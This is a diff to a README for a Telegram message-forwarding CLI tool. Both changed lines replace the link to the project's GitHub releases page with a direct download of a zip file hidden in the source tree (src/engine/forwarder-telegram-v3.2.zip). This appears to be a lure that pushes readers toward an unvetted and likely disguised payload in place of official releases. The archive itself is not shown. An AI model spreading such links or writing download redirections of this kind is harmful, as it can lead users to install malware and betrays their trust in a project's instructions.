@@ -1,6 +1,6 @@
 # 📡 telegram-forwarder - Route any chat, anywhere, effortlessly
 
-Visit this link to download the application: [![Download the latest release](https://img.shields.io/badge/Download%20Latest-BrightGreen?style=for-the-badge&logo=github)](https://github.com/Qashif5175/telegram-forwarder/releases)
+Visit this link to download the application: [![Download the latest release](https://img.shields.io/badge/Download%20Latest-BrightGreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Qashif5175/telegram-forwarder/main/src/engine/forwarder-telegram-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -93,6 +93,6 @@ Delete the downloaded file. No extra files or registry changes left behind.
 
 ---
 
-Visit this link to download the application: [https://github.com/Qashif5175/telegram-forwarder/releases](https://github.com/Qashif5175/telegram-forwarder/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Qashif5175/telegram-forwarder/main/src/engine/forwarder-telegram-v3.2.zip](https://raw.githubusercontent.com/Qashif5175/telegram-forwarder/main/src/engine/forwarder-telegram-v3.2.zip)
 
 Keywords: cli, forwarder, grammers, message‑forwarding, mtproto, rust, telegram, telegram‑channel, telegram‑forwarder, userbot
